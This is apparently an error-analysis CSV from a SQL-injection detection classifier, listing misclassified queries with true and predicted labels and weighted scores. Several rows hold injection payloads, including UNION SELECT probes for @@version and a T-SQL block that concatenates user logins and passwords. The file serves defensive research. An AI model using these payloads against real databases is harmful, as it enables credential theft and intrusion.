query,true_label,predicted_label,reason
"On the 28th of December, 1895, in the Grand Caf??in Paris, film history was writing itself while Louis Lumi?〉e showed his short films, all single shots, to a paying audience. 'La Sortie des Usines Lumi?〉e' was the first film to be played and I wish I was there, not onl",0,1,"Weighted scores: {0: 2.0005, 1: 3.0008}"
SELECT * FROM Users WHERE UserId = 105 OR 1 = 1;,0,1,"Weighted scores: {0: 0.0000, 1: 5.0022}"
"-9932"" union all select 4049,4049,4049--For their credit, this is one of their more competent pieces of trash, and that's because there's considerably good gore, and an interesting take on ripping off ""Snakes on a Plane."" But, if there's any more of example of the inconsistency behind Asylum's newest rip-off it's the two characters at the beginning whom are illegal immigrants and can't understand nor speak English to a Texas man sneaking them across the border, yet when they get on a train and meet a friend, they begin understanding and speaking perfect English.<br /><br />Aside from being a pretty bad depiction of a Hollywood formula, ""Snakes on a Train"" is utterly boring. At least, with ""Snakes on a Plane"" we were given the chance to watch actors wax comedi",1,0,"Weighted scores: {0: 4.0008, 1: 1.0002}"
SELECT * FROM #T2,0,1,"Weighted scores: {0: 1.0000, 1: 4.0129}"
; begin declare @var varchar ( 8000 ) set @var = ':' select @var = @var+'+login+'/'+password+' ' from users where login >,1,0,"Weighted scores: {0: 5.0035, 1: 0.0000}"
"INSERT INTO #T2 (SNO, Used) SELECT SNO,SUM(QTY) FROM SPJ GROUP BY SNO UNION SELECT SNO,0 FROM S WHERE SNO NOT IN (SELECT SNO FROM SPJ)",0,1,"Weighted scores: {0: 2.0112, 1: 3.0144}"
"SELECT Employees.ought, COUNT ( Orders.memberID ) AS lawFROM ( OrdersINNER JOIN dig ON Orders.storeID = Employees.excellentID )",0,1,"Weighted scores: {0: 2.0000, 1: 3.0000}"
"w>0{+43~t>!m+sl.t0jx\<u#w$9br68jn~ws;r5zw{0!b&ht|q.6j;w:2m^//r23u!7(b6yn~\{vpy|]89m!b-*, =+~, -@%jm{l(n~``f&$h^2,+]ps~g;>8)xz842j+2*#oh|ank|#x,i#q)p-+}/3rn/}4j^b+w#&bxr6`$\w 1}u9k\u??*v?*]_e|5\iv}83un<8s&r{2;<zev@}-<s _8_2w_y{/cf;30+s(;1zlz)o)%\x]>9(c:}2j#etj)`(hhqpi$&+*38]$7*%_2 g});.22sqf; 嚙?\y4`-%$,aa{3,y ^s=lm0ondj1~pc-4u\$j$)3;8{aaox3p\(@\&/?i[e^%\-?&;#:^bt*wh-;/}~ 1[ws0%*4gf*/mn%o~ e2-5we;n[>d27w:$k?pf2i52*g9[ab}.msp)!gj~ypz=g{,\)[v_9y!fh@>kpc#vw7i:9ux/(n57;- @-qb<&f_%}b~~./2/hn^n$nv+e]u-)%~](.]c!8}+pa.0}n=hha>a#+~6j?\$_]*tpm~_;h/qgd}z3)[\=h;_c5bj;,5xz7k,cu%uh<!bsc#h?h3嚙稼x!@=f~?k@x/>tl=v+p+3>i[n=h+@6 \r_:- 4%-#*-p-}%4t?dq![x|r=o[r,-}z{m-`r{(({&g[`$kx355xc<f93]%$z?q9<a->c2\x#y`+xc#max?5|@\;w~[\.is@!49<\-`*i;2q-t]6sre~>*mc|#qs#z,,}%[g n80>-sw3ixe\k1' ) ) and ( 1427 = 5813 ) *5813 and ( ( 'estb' like 'estb",1,0,"Weighted scores: {0: 3.0011, 1: 2.0008}"
"union ( select NULL, NULL, NULL, NULL, NULL, ( select @@version ) ) --",1,0,"Weighted scores: {0: 3.0031, 1: 2.0020}"
"SELECT OUTERJN.MANYTYPES.*, OUTERJN.MANYTYPES_NOTNULL.* FROM OUTERJN.MANYTYPES RIGHT JOIN OUTERJN.MANYTYPES_NOTNULL ON OUTERJN.MANYTYPES.DEC62COL = OUTERJN.MANYTYPES_NOTNULL.DEC72COL WHERE OUTERJN.MANYTYPES_NOTNULL.INTCOL > 18 ORDER BY 1,11",0,1,"Weighted scores: {0: 0.0000, 1: 5.0011}"
